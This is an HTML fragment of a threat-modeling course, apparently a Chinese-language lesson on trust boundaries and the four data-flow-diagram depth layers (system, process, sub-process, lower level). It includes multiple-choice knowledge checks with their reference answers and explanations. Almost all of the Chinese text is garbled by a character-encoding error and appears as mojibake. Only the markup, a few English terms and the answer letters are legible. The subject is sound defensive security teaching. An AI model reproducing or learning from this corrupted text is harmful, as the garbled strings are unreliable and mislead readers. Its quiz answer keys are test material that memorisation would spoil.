title="åŒ…å«ä¸Šä¸‹æ–‡"></a>åŒ…å«ä¸Šä¸‹æ–‡</h4><p>åœ¨æ¯ä¸ªä¿¡ä»»è¾¹ç•Œå…ƒç´ ä¸­åŒ…å«ä»¥ä¸‹ä¸Šä¸‹æ–‡ï¼š</p><table><thead><tr><th align="left">ä¸Šä¸‹æ–‡</th><th align="left">é—®é¢˜</th></tr></thead><tbody><tr><td align="left">æè¿°</td><td align="left">å…¬å¸ç½‘ç»œè¾¹ç•Œï¼ŸInternetï¼Ÿ Azure è®¢é˜…ï¼Ÿ</td></tr></tbody></table><h4 id="çŸ¥è¯†æ£€æŸ¥-8"><a href="#çŸ¥è¯†æ£€æŸ¥-8" class="headerlink" title="çŸ¥è¯†æ£€æŸ¥"></a>çŸ¥è¯†æ£€æŸ¥</h4><ol><li>ä»¥ä¸‹å“ªä¸€é¡¹æ“ä½œæœ€èƒ½æè¿°è·¨ä¿¡ä»»è¾¹ç•Œçš„æ•°æ®ï¼Ÿ</li></ol><div class='checkbox'><input type="radio" />            <p>A. ç”¨æˆ·å‘é€åˆ°æ‰˜ç®¡åœ¨ Azure ä¸Šçš„ Web æœåŠ¡çš„æ•°æ®ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>B. åœ¨åŒä¸€ Azure è®¢é˜…ä¸‹ï¼Œä» Web æœåŠ¡å‘é€åˆ° Azure ä¸Šçš„æ•°æ®å­˜å‚¨çš„æ•°æ®ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>C. ä»æ•°æ®å­˜å‚¨å‘é€åˆ° Azure ä¸ŠåŒä¸€ç§Ÿæˆ·ä¸‹çš„è¿›ç¨‹çš„æ•°æ®ã€‚</p>            </div><p>å‚è€ƒç­”æ¡ˆï¼š<psw>== A ==</psw></p><p>è§£é‡Šï¼š<psw>A. å°†æ•°æ®ä»ä¸å—ä¿¡ä»»çš„åŒºåŸŸä¼ è¾“åˆ°å—ä¿¡ä»»åŒºåŸŸçš„è¡Œä¸ºè·¨è¶Šäº†ä¿¡ä»»è¾¹ç•Œã€‚B. ä»åŒä¸€å—ä¿¡ä»»åŒºåŸŸå†…çš„èµ„æºä¼ è¾“æ•°æ®çš„è¡Œä¸ºä¸ä¼šè·¨è¶Šä¿¡ä»»è¾¹ç•Œã€‚C. ä»åŒä¸€å—ä¿¡ä»»åŒºåŸŸå†…çš„èµ„æºä¼ è¾“æ•°æ®çš„è¡Œä¸ºä¸ä¼šè·¨è¶Šä¿¡ä»»è¾¹ç•Œã€‚</psw></p><h3 id="å°ç»“-1"><a href="#å°ç»“-1" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p>æ•°æ®æµå…³ç³»å›¾æ˜¯ç³»ç»Ÿçš„å›¾å½¢è¡¨ç¤ºå½¢å¼ï¼Œå®ƒåº”åŒ…å«æ¯ä¸ªé€‚ç”¨çš„è¿‡ç¨‹ã€æ•°æ®å­˜å‚¨ã€å¤–éƒ¨å®ä½“ã€æ•°æ®æµå’Œä¿¡ä»»è¾¹ç•Œã€‚</p><p>æœ¬æ¨¡å—æ¶µç›–äº†ä»¥ä¸‹å†…å®¹ï¼š</p><ul><li>åŒºåˆ†äº†æ¯ä¸ªå…ƒç´ çš„å½¢çŠ¶å’ŒåŠŸèƒ½</li><li>äº†è§£äº†åœ¨åˆ›å»ºæ•°æ®æµå…³ç³»å›¾æ—¶å…ƒç´ çš„æ­£ç¡®ä¸Šä¸‹æ–‡</li></ul><h2 id="æ¨¡å—3-æä¾›å…·æœ‰é€‚å½“æ·±åº¦å±‚çš„ä¸Šä¸‹æ–‡"><a href="#æ¨¡å—3-æä¾›å…·æœ‰é€‚å½“æ·±åº¦å±‚çš„ä¸Šä¸‹æ–‡" class="headerlink" title="æ¨¡å—3 | æä¾›å…·æœ‰é€‚å½“æ·±åº¦å±‚çš„ä¸Šä¸‹æ–‡"></a>æ¨¡å—3 | æä¾›å…·æœ‰é€‚å½“æ·±åº¦å±‚çš„ä¸Šä¸‹æ–‡</h2><h3 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>å·¥ç¨‹å¸ˆåˆ©ç”¨å¨èƒå»ºæ¨¡èƒ½å¤Ÿä»¥å›¾å½¢æ–¹å¼å‘ä»–äººæè¿°ç³»ç»Ÿã€‚ å®ƒåˆ›å»ºäº†ä¸€ä¸ªå…±åŒçš„åŸºç¡€ï¼Œå¹¶å®ç°äº†æ›´åŠ é›†ä¸­çš„å®‰å…¨å¯¹è¯ã€‚</p><h4 id="æ·±åº¦å±‚çš„é‡è¦æ€§"><a href="#æ·±åº¦å±‚çš„é‡è¦æ€§" class="headerlink" title="æ·±åº¦å±‚çš„é‡è¦æ€§"></a>æ·±åº¦å±‚çš„é‡è¦æ€§</h4><p>æ ¹æ®è¦æ„å»ºçš„ç³»ç»Ÿå’Œæ‰€éœ€çš„ä¸Šä¸‹æ–‡ï¼Œå¨èƒæ¨¡å‹å¯èƒ½å˜å¾—å¤ªå¤æ‚æˆ–çº§åˆ«å¤ªé«˜ã€‚</p><p>æ•°æ®æµå…³ç³»å›¾æ·±åº¦å±‚å¯å¸®åŠ©ä½ äº†è§£è¦åŒ…å«å¤šå°‘ä¸Šä¸‹æ–‡ä»¥åŠä½•æ—¶ä½¿ç”¨å®ƒä»¬ã€‚</p><div class="note green"><p>è¯·ä¸åŒäº‹å’Œå®‰å…¨å›¢é˜Ÿè”ç³»ï¼Œé€‰æ‹©é€‚å½“çš„æ·±åº¦å±‚ã€‚ ä¹Ÿå¯ä»¥å°†æ­¤æ¨¡å—ç”¨ä½œå‚è€ƒã€‚</p></div><h4 id="å­¦ä¹ ç›®æ ‡-2"><a href="#å­¦ä¹ ç›®æ ‡-2" class="headerlink" title="å­¦ä¹ ç›®æ ‡"></a>å­¦ä¹ ç›®æ ‡</h4><p>åœ¨æœ¬æ¨¡å—ä¸­ï¼Œä½ å°†èƒ½å¤Ÿï¼š</p><ul><li>äº†è§£æ•°æ®æµå…³ç³»å›¾æ·±åº¦å±‚ä¹‹é—´çš„å·®å¼‚</li><li>äº†è§£ä½•æ—¶ä½¿ç”¨æ¯ä¸ªå±‚</li></ul><div class="note success"><p>æ— å¿…å¤‡çŸ¥è¯†å³å¯å­¦ä¹  ï¼ˆ</p></div><h3 id="æ•°æ®æµå…³ç³»å›¾æ·±åº¦å±‚"><a href="#æ•°æ®æµå…³ç³»å›¾æ·±åº¦å±‚" class="headerlink" title="æ•°æ®æµå…³ç³»å›¾æ·±åº¦å±‚"></a>æ•°æ®æµå…³ç³»å›¾æ·±åº¦å±‚</h3><p>æ•°æ®æµå…³ç³»å›¾æ·±åº¦å±‚å¯å¸®åŠ©ä½ ç¡®å®šè¦æˆåŠŸè¿›è¡Œå¨èƒå»ºæ¨¡ç»ƒä¹ åº”åŒ…æ‹¬å¤šå°‘ä¸Šä¸‹æ–‡ã€‚ æœ‰å¤šä¸ªå› ç´ å¯å¸®åŠ©ç¡®å®šè¦äº†è§£çš„æ·±åº¦ã€‚</p><p>æ¯ä¸ªç³»ç»Ÿéƒ½åº”è¯¥å¤§è‡´äº†è§£å®ƒä»¬çš„å·¥ä½œæ–¹å¼ã€‚ å¤§å¤šæ•°ç³»ç»Ÿåº”è¯¥å…·æœ‰é™„åŠ çš„æ•°æ®æµå…³ç³»å›¾ï¼Œè¿™äº›å…³ç³»å›¾ä¾§é‡äºéœ€è¦ä»”ç»†ç ”ç©¶çš„ç³»ç»Ÿéƒ¨åˆ†ã€‚</p><p>ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li>åˆ†æé«˜åº¦æ•æ„Ÿæ•°æ®çš„è¿‡ç¨‹</li><li>ç¬¬ä¸‰æ–¹èº«ä»½éªŒè¯ç³»ç»Ÿ</li></ul><p>å¨èƒå»ºæ¨¡ä¸­å¤§è‡´ä½¿ç”¨äº†å››ä¸ªæ·±åº¦å±‚ï¼š</p><table><thead><tr><th align="left">å±‚</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">å¯¹äºæ‰€æœ‰ç³»ç»Ÿéƒ½æ˜¯å¿…éœ€çš„ï¼Œå¹¶ä¸”åŒ…å«ä¸»è¦ç³»ç»Ÿéƒ¨åˆ†ã€‚</td></tr><tr><td align="left">1</td><td align="left">å¯¹äºå¤§å¤šæ•°ç³»ç»Ÿæ˜¯å¿…éœ€çš„ï¼Œå¹¶ä¸”åŒ…å«æ¯ä¸ªç³»ç»Ÿéƒ¨åˆ†çš„å…¶ä»–å…³ç³»å›¾ã€‚</td></tr><tr><td align="left">2</td><td align="left">å¯¹äºé«˜åº¦æ•æ„Ÿçš„ç³»ç»Ÿæ˜¯å¿…éœ€çš„ï¼Œå¹¶ä¸”åŒ…å«ç³»ç»Ÿå­éƒ¨åˆ†çš„å…¶ä»–å…³ç³»å›¾ã€‚</td></tr><tr><td align="left">3</td><td align="left">å¯¹äºå…³é”®çº§åˆ«ç³»ç»Ÿæˆ–å†…æ ¸çº§åˆ«ç³»ç»Ÿæ˜¯å¿…éœ€çš„ï¼Œå¹¶ä¸”åŒ…å«æ¯ä¸ªè¿‡ç¨‹çš„å…¶ä»–å…³ç³»å›¾ã€‚</td></tr></tbody></table><p><img src="/img/thread-modeling/depthlayers.png" class="lazyload" data-srcset="/img/thread-modeling/depthlayers.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="depthlayers"></p><p>æˆ‘ä»¬å°†åœ¨æ¥ä¸‹æ¥çš„å‡ ä¸ªå•å…ƒä¸­ä»‹ç»å„ä¸ªæ·±åº¦å±‚ã€‚</p><h3 id="ç¬¬-0-å±‚-ç³»ç»Ÿå±‚"><a href="#ç¬¬-0-å±‚-ç³»ç»Ÿå±‚" class="headerlink" title="ç¬¬ 0 å±‚ - ç³»ç»Ÿå±‚"></a>ç¬¬ 0 å±‚ - ç³»ç»Ÿå±‚</h3><p>æ•°æ®æµå…³ç³»å›¾çš„ç³»ç»Ÿå±‚æ˜¯ä»»ä½•ç³»ç»Ÿçš„èµ·ç‚¹ï¼Œå› æ­¤å¿…é¡»ä¸ºæ‰€æœ‰ç³»ç»Ÿåˆ›å»ºç³»ç»Ÿå±‚ã€‚</p><p><u><strong>ç›®æ ‡ï¼š</strong></u><strong>è¡¨ç¤ºä¸»è¦çš„ç³»ç»Ÿéƒ¨åˆ†ï¼ˆå…·æœ‰è¶³å¤Ÿçš„ä¸Šä¸‹æ–‡ï¼‰ï¼Œå¯å¸®åŠ©ä½ äº†è§£å…¶å·¥ä½œåŸç†åŠå½¼æ­¤äº¤äº’æ–¹å¼ã€‚</strong></p><p>ç³»ç»Ÿå±‚å…³ç³»å›¾åº”å®¹çº³åœ¨ä¸€ä¸ªé¡µé¢ä¸­ã€‚ å®ƒè¿˜åº”åªåŒ…å«ç³»ç»Ÿå¤„ç†çš„ä¸»è¦è¿‡ç¨‹ã€‚ æä¾›å°½å¯èƒ½å¤šçš„ä¸Šä¸‹æ–‡ï¼Œå¹¶æ¸…æ¥šæ ‡è®°æ¯ä¸ªå…ƒç´ ï¼Œä»¥ä¾¿ä»»ä½•äººéƒ½èƒ½ç†è§£å®ƒçš„å·¥ä½œæ–¹å¼ã€‚</p><div class="note green"><p>ç³»ç»Ÿå±‚ä¹Ÿç§°ä¸ºä¸Šä¸‹æ–‡å±‚ã€‚</p></div><h4 id="ä½•æ—¶ä½¿ç”¨ç³»ç»Ÿå±‚"><a href="#ä½•æ—¶ä½¿ç”¨ç³»ç»Ÿå±‚" class="headerlink" title="ä½•æ—¶ä½¿ç”¨ç³»ç»Ÿå±‚"></a>ä½•æ—¶ä½¿ç”¨ç³»ç»Ÿå±‚</h4><p>ä½ åˆ›å»ºçš„æ¯ä¸ªç³»ç»Ÿéƒ½éœ€è¦ç³»ç»Ÿå±‚ã€‚ é«˜çº§åˆ«çš„ä¸Šä¸‹æ–‡å¯ä»¥å¸®åŠ©ä»»ä½•äººæ·±å…¥äº†è§£ç³»ç»Ÿï¼Œä»è€Œå‚ä¸æ›´æœ‰æ„ä¹‰çš„è®¨è®ºã€‚</p><h4 id="æ·±å…¥äº†è§£ç³»ç»Ÿéƒ¨åˆ†"><a href="#æ·±å…¥äº†è§£ç³»ç»Ÿéƒ¨åˆ†" class="headerlink" title="æ·±å…¥äº†è§£ç³»ç»Ÿéƒ¨åˆ†"></a>æ·±å…¥äº†è§£ç³»ç»Ÿéƒ¨åˆ†</h4><p>åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œç³»ç»Ÿéƒ¨åˆ†éœ€è¦è¿›è¡Œæ›´æ·±å…¥çš„ç ”ç©¶ï¼Œå› ä¸ºå®ƒä»¬ä¼šå¸¦æ¥é£é™©ã€‚</p><p>ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li><u>ä»»ä½•æ–°ç³»ç»Ÿéƒ½ä¼šç»™ç¯å¢ƒå¸¦æ¥æœªçŸ¥é£é™©</u></li><li>æ–°çš„åˆ†æç¨‹åºã€åè®®å’Œæ–‡ä»¶æ ¼å¼</li><li>æ–°çš„èº«ä»½éªŒè¯å’Œæˆæƒæœºåˆ¶</li><li>æ–°çš„æœºå¯†å­˜å‚¨æˆ–åŠ å¯†ç®—æ³•</li><li><u>ä¸ç¬¬ä¸‰æ–¹èº«ä»½éªŒè¯ç³»ç»Ÿï¼ˆä¾‹å¦‚ Facebookï¼‰é›†æˆ</u></li><li>ä¸»è¦åŠŸèƒ½æ‰€éœ€çš„æå‡æƒé™</li><li>æ‰€éœ€çš„æœªåŠ å¯†ä¿¡é“</li></ul><p>å¦‚æœæ˜¯è¿™ç§æƒ…å†µï¼Œè¯·ä¸ºæ¯ä¸ªç³»ç»Ÿéƒ¨åˆ†åˆ›å»ºå…¶ä»–æ•°æ®æµå…³ç³»å›¾ã€‚ æ‰§è¡Œä»¥ä¸‹æ­¥éª¤ï¼š</p><table><thead><tr><th align="left">æ­¥éª¤</th><th align="left">æŒ‡å—</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">ä½¿ç”¨æ¸…æ™°çš„æè¿°æ ‡ç­¾åˆ›å»ºä¸€ä¸ªè¿‡ç¨‹å…ƒç´ ï¼Œä¾‹å¦‚â€œWeb æœåŠ¡åç§°â€ã€‚</td></tr><tr><td align="left">2</td><td align="left">åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ï¼Œå¹¶å®Œå…¨æŒ‰ç…§æè¿°æ ‡ç­¾ä¸ºå…¶å‘½åã€‚</td></tr><tr><td align="left">3</td><td align="left">ä»…å°†æ•°æ®æµå…³ç³»å›¾ä¾§é‡äºè¦â€œæ”¾å¤§â€çš„ç³»ç»Ÿéƒ¨åˆ†ã€‚</td></tr></tbody></table><p>ç»“æœå°†è·å¾—è¿‡ç¨‹å±‚ï¼ˆç§°ä¸ºç¬¬ 1 å±‚ï¼‰ä¸­çš„ä¸€ç³»åˆ—æ•°æ®æµå…³ç³»å›¾ã€‚</p><h4 id="çŸ¥è¯†æ£€æŸ¥-9"><a href="#çŸ¥è¯†æ£€æŸ¥-9" class="headerlink" title="çŸ¥è¯†æ£€æŸ¥"></a>çŸ¥è¯†æ£€æŸ¥</h4><ol><li>ç¬¬ 0 å±‚é€šå¸¸è¢«ç§°ä¸ºä»€ä¹ˆï¼Ÿ</li></ol><div class='checkbox'><input type="radio" />            <p>A. ä¸Šä¸‹æ–‡å±‚ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>B. è¿‡ç¨‹å±‚ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>C. å­è¿‡ç¨‹å±‚ã€‚</p>            </div><p>å‚è€ƒç­”æ¡ˆï¼š<psw>== A ==</psw></p><p>è§£é‡Šï¼š<psw>A. æ­¤å±‚æ˜¯ä»»ä½•ç³»ç»Ÿçš„èµ·ç‚¹ã€‚ ä¹Ÿç§°ä¸ºç³»ç»Ÿå±‚ã€‚B. æ­¤å±‚ä¾§é‡äºæ¯ä¸ªç³»ç»Ÿéƒ¨åˆ†ã€‚C. æ­¤å±‚ä¾§é‡äºç‰¹å®šç³»ç»Ÿéƒ¨åˆ†çš„ç³»ç»Ÿå­éƒ¨åˆ†ã€‚</psw></p><h3 id="ç¬¬-1-å±‚-è¿‡ç¨‹å±‚"><a href="#ç¬¬-1-å±‚-è¿‡ç¨‹å±‚" class="headerlink" title="ç¬¬ 1 å±‚ - è¿‡ç¨‹å±‚"></a>ç¬¬ 1 å±‚ - è¿‡ç¨‹å±‚</h3><p>æ•°æ®æµå…³ç³»å›¾çš„è¿‡ç¨‹å±‚æ˜¯ç¬¬äºŒå±‚ä¸”åº”è¯¥ç”¨äºå¤§å¤šæ•°ç³»ç»Ÿã€‚ æ­¤å±‚çš„æ•°æ®æµå…³ç³»å›¾åŒ…å«å•ç‹¬çš„æ•°æ®æµå…³ç³»å›¾ï¼Œè¿™äº›å…³ç³»å›¾è¯¦ç»†ä»‹ç»æ¯ä¸ªç³»ç»Ÿéƒ¨åˆ†ã€‚</p><p><u><strong>ç›®æ ‡ï¼š</strong></u>è¡¨ç¤ºæ¬¡è¦çš„ç³»ç»Ÿéƒ¨åˆ†ï¼ˆå…·æœ‰è¶³å¤Ÿçš„ä¸Šä¸‹æ–‡ï¼‰ï¼Œå¯å¸®åŠ©ä½ äº†è§£å…¶å·¥ä½œåŸç†åŠå½¼æ­¤äº¤äº’æ–¹å¼ã€‚</p><p>ä¸ç³»ç»Ÿå±‚ç›¸ä¼¼ï¼Œè¿‡ç¨‹å±‚ä¸­çš„æ•°æ®æµå…³ç³»å›¾åº”å®¹çº³åœ¨ä¸€ä¸ªé¡µé¢ä¸­ï¼Œå¹¶åŒ…å«å…¶å„è‡ªç³»ç»Ÿéƒ¨åˆ†çš„æ‰€æœ‰è¿‡ç¨‹ã€‚</p><div class="note warning"><p>å¤§å¤šæ•°æ•°æ®æµå…³ç³»å›¾éƒ½éœ€è¦è¿‡ç¨‹çº§åˆ«æ·±åº¦å±‚æ‰èƒ½è¿›è¡Œæ­£ç¡®è¯„ä¼°ã€‚</p></div><h4 id="ä½•æ—¶ä½¿ç”¨è¿‡ç¨‹å±‚"><a href="#ä½•æ—¶ä½¿ç”¨è¿‡ç¨‹å±‚" class="headerlink" title="ä½•æ—¶ä½¿ç”¨è¿‡ç¨‹å±‚"></a>ä½•æ—¶ä½¿ç”¨è¿‡ç¨‹å±‚</h4><p>å¯¹æ¯ä¸ªç³»ç»Ÿéƒ½ä½¿ç”¨è¿‡ç¨‹å±‚ï¼Œ<u>å°¤å…¶æ˜¯åœ¨å¤„ç†æ•æ„Ÿæ•°æ®æ—¶</u>ã€‚ å…·æœ‰æ•æ„Ÿæ•°æ®çš„ç³»ç»Ÿé­å—æ”»å‡»çš„é£é™©æ›´é«˜ã€‚ <u>æ­¤çº§åˆ«çš„ä¸Šä¸‹æ–‡å¯å¸®åŠ©ä½ æ‰¾å‡ºå¨èƒä»¥åŠæ›´æœ‰æ•ˆåœ°é™ä½æˆ–æ¶ˆé™¤é£é™©çš„æ–¹æ³•</u>ã€‚</p><h4 id="æ·±å…¥äº†è§£ç³»ç»Ÿéƒ¨åˆ†-1"><a href="#æ·±å…¥äº†è§£ç³»ç»Ÿéƒ¨åˆ†-1" class="headerlink" title="æ·±å…¥äº†è§£ç³»ç»Ÿéƒ¨åˆ†"></a>æ·±å…¥äº†è§£ç³»ç»Ÿéƒ¨åˆ†</h4><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œç”±äºç³»ç»Ÿéƒ¨åˆ†çš„æ•æ„Ÿæ€§å’Œé£é™©å¢åŠ ï¼Œå¯èƒ½éœ€è¦æ›´ç²¾ç»†çš„ä¸Šä¸‹æ–‡ã€‚ é€šè¿‡è½¬åˆ°æ­¤å±‚ï¼Œå¯ä»¥æ›´å¥½åœ°è¯„ä¼°å¨èƒå’Œé£é™©é™ä½ç­–ç•¥ã€‚ éµå¾ªç³»ç»Ÿå±‚ä¸­çš„ç›¸åŒè§„åˆ™ã€‚</p><table><thead><tr><th align="left">æ­¥éª¤</th><th align="left">æŒ‡å—</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">ä½¿ç”¨æ¸…æ™°çš„æè¿°æ ‡ç­¾åˆ›å»ºä¸€ä¸ªè¿‡ç¨‹å…ƒç´ ï¼Œä¾‹å¦‚â€œWeb æœåŠ¡å·¥ä½œè¿›ç¨‹åç§°â€ã€‚</td></tr><tr><td align="left">2</td><td align="left">åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ï¼Œå¹¶å®Œå…¨æŒ‰ç…§æè¿°æ ‡ç­¾ä¸ºå…¶å‘½åï¼Œå‘½åé‡‡ç”¨ç±»ä¼¼è·¯å¾„çš„ç»“æ„ï¼Œä¾‹å¦‚â€œWeb æœåŠ¡åç§° - Web æœåŠ¡å·¥ä½œè¿›ç¨‹åç§°â€ã€‚</td></tr><tr><td align="left">3</td><td align="left">ä»…å°†æ•°æ®æµå…³ç³»å›¾ä¾§é‡äºè¦â€œæ”¾å¤§â€çš„ç³»ç»Ÿå­éƒ¨åˆ†ã€‚</td></tr></tbody></table><p>ç»“æœå°†è·å¾—å­è¿‡ç¨‹å±‚ï¼ˆç§°ä¸ºç¬¬ 2 å±‚ï¼‰ä¸­çš„ä¸€ç³»åˆ—æ•°æ®æµå…³ç³»å›¾ã€‚</p><div class="note green"><p>ç±»ä¼¼è·¯å¾„çš„æ–‡ä»¶å‘½åç»“æ„æœ‰åŠ©äºåŒºåˆ†ä¸åŒçš„çº§åˆ«</p></div><h4 id="çŸ¥è¯†æ£€æŸ¥-10"><a href="#çŸ¥è¯†æ£€æŸ¥-10" class="headerlink" title="çŸ¥è¯†æ£€æŸ¥"></a>çŸ¥è¯†æ£€æŸ¥</h4><ol><li>å¤§å¤šæ•°åº”ç”¨ç¨‹åºå±äºå“ªä¸€å±‚ï¼Ÿ</li></ol><div class='checkbox'><input type="radio" />            <p>A. ä¸Šä¸‹æ–‡å±‚ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>B. è¿‡ç¨‹å±‚ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>C. å­è¿‡ç¨‹å±‚ã€‚</p>            </div><p>å‚è€ƒç­”æ¡ˆï¼š<psw>== B ==</psw></p><p>è§£é‡Šï¼š<psw>A. æ­¤å±‚æ˜¯ä»»ä½•ç³»ç»Ÿçš„èµ·ç‚¹ã€‚ ä¹Ÿç§°ä¸ºç³»ç»Ÿå±‚ã€‚B. æ­¤å±‚ä¾§é‡äºæ¯ä¸ªç³»ç»Ÿéƒ¨åˆ†ã€‚C. æ­¤å±‚ä¾§é‡äºç‰¹å®šç³»ç»Ÿéƒ¨åˆ†çš„ç³»ç»Ÿå­éƒ¨åˆ†ã€‚</psw></p><h3 id="ç¬¬-2-å±‚-å­è¿‡ç¨‹å±‚"><a href="#ç¬¬-2-å±‚-å­è¿‡ç¨‹å±‚" class="headerlink" title="ç¬¬ 2 å±‚ - å­è¿‡ç¨‹å±‚"></a>ç¬¬ 2 å±‚ - å­è¿‡ç¨‹å±‚</h3><p>æ•°æ®æµå…³ç³»å›¾å­è¿‡ç¨‹æ˜¯ç¬¬ä¸‰å±‚ã€‚ <u>æ¯å½“åœ¨åˆ›å»ºé«˜åº¦æ•æ„Ÿçš„ç³»ç»Ÿæ—¶å°±åº”ä½¿ç”¨è¯¥å±‚</u>ã€‚ æ­¤å±‚çš„æ•°æ®æµå…³ç³»å›¾åŒ…å«å•ç‹¬çš„æ•°æ®æµå…³ç³»å›¾ï¼Œè¿™äº›å…³ç³»å›¾åˆ†åˆ«è¯¦ç»†ä»‹ç»æ¯ä¸ªç³»ç»Ÿå­éƒ¨åˆ†ã€‚</p><p>ç›®æ ‡ï¼šè¡¨ç¤ºç³»ç»Ÿå­éƒ¨åˆ†ï¼ˆå…·æœ‰è¶³å¤Ÿçš„ä¸Šä¸‹æ–‡ï¼‰ï¼Œå¯å¸®åŠ©ä½ äº†è§£å…¶å·¥ä½œåŸç†åŠå½¼æ­¤äº¤äº’æ–¹å¼ã€‚</p><p>ä¸è¿‡ç¨‹å±‚ç›¸ä¼¼ï¼Œç³»ç»Ÿå­è¿‡ç¨‹å±‚ä¸­çš„æ•°æ®æµå…³ç³»å›¾åº”å®¹çº³åœ¨ä¸€ä¸ªé¡µé¢ä¸­ï¼Œå¹¶åŒ…å«å…¶å„è‡ªç³»ç»Ÿå­éƒ¨åˆ†çš„æ‰€æœ‰è¿‡ç¨‹ã€‚</p><div class="note warning"><p>è¯·ä¸ä½ çš„å›¢é˜Ÿæ ¸å¯¹ä»¥ç¡®è®¤æ˜¯å¦éœ€è¦æ­¤æ·±åº¦çº§åˆ«ã€‚</p></div><h4 id="ä½•æ—¶ä½¿ç”¨å­è¿‡ç¨‹å±‚"><a href="#ä½•æ—¶ä½¿ç”¨å­è¿‡ç¨‹å±‚" class="headerlink" title="ä½•æ—¶ä½¿ç”¨å­è¿‡ç¨‹å±‚"></a>ä½•æ—¶ä½¿ç”¨å­è¿‡ç¨‹å±‚</h4><p>å°†å­è¿‡ç¨‹å±‚ç”¨äºç»„ç»‡è®¤ä¸ºæ¯”è¾ƒå…³é”®çš„ç³»ç»Ÿã€‚ ç³»ç»Ÿå­éƒ¨åˆ†ä¸­çš„æ¼æ´å¯èƒ½ä¼šä½¿æ•´ä¸ªç³»ç»Ÿã€å®¢æˆ·å’Œç»„ç»‡é¢ä¸´é‡å¤§é£é™©ã€‚</p><p>ç¤ºä¾‹åŒ…æ‹¬ä»¥ä¸‹ç³»ç»Ÿï¼š</p><ul><li>åœ¨å®‰å…¨ç¯å¢ƒä¸­ä½¿ç”¨çš„ç³»ç»Ÿ</li><li>å¤„ç†æ•æ„Ÿæ•°æ®çš„ç³»ç»Ÿ</li><li>å…·æœ‰é«˜é£é™©è¯„åˆ†çš„ç³»ç»Ÿ</li></ul><h4 id="æ·±å…¥äº†è§£ç³»ç»Ÿå­éƒ¨åˆ†"><a href="#æ·±å…¥äº†è§£ç³»ç»Ÿå­éƒ¨åˆ†" class="headerlink" title="æ·±å…¥äº†è§£ç³»ç»Ÿå­éƒ¨åˆ†"></a>æ·±å…¥äº†è§£ç³»ç»Ÿå­éƒ¨åˆ†</h4><p>ä»»ä½•éœ€è¦æ›´æ·±å…¥ç ”ç©¶çš„ç³»ç»Ÿå­éƒ¨åˆ†éƒ½åº”éµå¾ªè¿‡ç¨‹å±‚ä¸­çš„ç›¸åŒè§„åˆ™ï¼Œå¹¶å…·æœ‰å„è‡ªç‹¬ç«‹çš„æ•°æ®æµå…³ç³»å›¾ã€‚ é€šè¿‡è¾ƒä½çº§åˆ«çš„è§†å›¾ï¼Œç”¨æˆ·å¯ä»¥â€œæ”¾å¤§â€å’Œâ€œç¼©å°â€ç³»ç»Ÿï¼Œä»¥å±•ç°å°½å¯èƒ½å¤šçš„ä¸Šä¸‹æ–‡å¹¶è¾¾åˆ°æ›´ä½³çš„æ¸…æ™°åº¦ã€‚ æ–¹æ³•å¦‚ä¸‹ï¼š</p><table><thead><tr><th align="left">æ­¥éª¤</th><th align="left">æŒ‡å—</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">ä½¿ç”¨æ¸…æ™°çš„æè¿°æ ‡ç­¾åˆ›å»ºä¸€ä¸ªè¿‡ç¨‹å…ƒç´ ï¼Œä¾‹å¦‚â€œè¾“å…¥åˆ†æç¨‹åºåç§°â€ã€‚</td></tr><tr><td align="left">2</td><td align="left">åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨ä¸æè¿°æ ‡ç­¾å®Œå…¨ç›¸åŒçš„åç§°ä¸ºå…¶å‘½åï¼Œå‘½åé‡‡ç”¨æ ‘çŠ¶ç»“æ„ï¼Œä¾‹å¦‚â€œWeb æœåŠ¡åç§° - Web æœåŠ¡å·¥ä½œè¿›ç¨‹åç§° - è¾“å…¥åˆ†æç¨‹åºåç§°â€ã€‚</td></tr><tr><td align="left">3</td><td align="left">ä»…å°†æ•°æ®æµå…³ç³»å›¾ä¾§é‡äºè¦â€œæ”¾å¤§â€çš„è¾ƒä½çº§åˆ«çš„ç³»ç»Ÿå­éƒ¨åˆ†ã€‚</td></tr></tbody></table><p>ç»“æœå°†å¾—åˆ°è¾ƒä½çº§åˆ«å±‚ï¼ˆç§°ä¸ºç¬¬ 3 å±‚ï¼‰ä¸­çš„ä¸€ç³»åˆ—æ•°æ®æµå…³ç³»å›¾ã€‚</p><div class="note green"><p>ç±»ä¼¼è·¯å¾„çš„æ–‡ä»¶å‘½åç»“æ„æœ‰åŠ©äºåŒºåˆ†ä¸åŒçš„çº§åˆ«ã€‚</p></div><h3 id="ç¬¬-3-å±‚-è¾ƒä½çº§åˆ«å±‚"><a href="#ç¬¬-3-å±‚-è¾ƒä½çº§åˆ«å±‚" class="headerlink" title="ç¬¬ 3 å±‚ - è¾ƒä½çº§åˆ«å±‚"></a>ç¬¬ 3 å±‚ - è¾ƒä½çº§åˆ«å±‚</h3><p>ä½çº§åˆ«å±‚æ˜¯æœ€åä¸€å±‚ï¼Œåº”åœ¨<u>åˆ›å»ºå†…æ ¸çº§åˆ«ç³»ç»Ÿæˆ–å…³é”®çº§åˆ«ç³»ç»Ÿæ—¶ä½¿ç”¨</u>ã€‚ 